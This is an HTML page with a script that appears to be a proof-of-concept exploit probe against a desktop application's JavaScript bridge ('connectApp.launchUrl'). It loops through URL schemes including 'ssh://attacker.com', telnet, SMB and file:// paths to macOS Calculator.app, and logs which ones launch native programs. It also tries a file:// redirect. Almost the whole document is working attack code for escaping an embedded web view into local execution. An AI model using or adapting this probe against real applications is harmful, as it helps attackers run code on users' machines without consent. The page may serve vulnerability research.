<html><body>
<div id="o"></div>
<script>
var o = document.getElementById('o');
function log(m) { o.innerHTML += m + '<br>'; }

// Try opening a Terminal via URL schemes that macOS supports
var urls = [
    'ssh://attacker.com',
    'telnet://127.0.0.1',
    'vnc://127.0.0.1',
    'smb://127.0.0.1/share',
    'ftp://127.0.0.1',
    'dict://127.0.0.1',
    'file:///System/Applications/Calculator.app',
    'file:///Applications/Calculator.app/Contents/MacOS/Calculator',
    'open:///Applications/Calculator.app',
    'x-man-page://ls'
];

for (var i = 0; i < urls.length; i++) {
    try {
        log('Trying: ' + urls[i]);
        connectApp.launchUrl(urls[i]);
    } catch(e) { log('  Error: ' + e.message); }
}

// Also try window.open and location
try {
    log('Trying window.location = file://...');
    window.location = 'file:///Applications/Calculator.app';
} catch(e) { log('  Error: ' + e.message); }

</script>
</body></html>
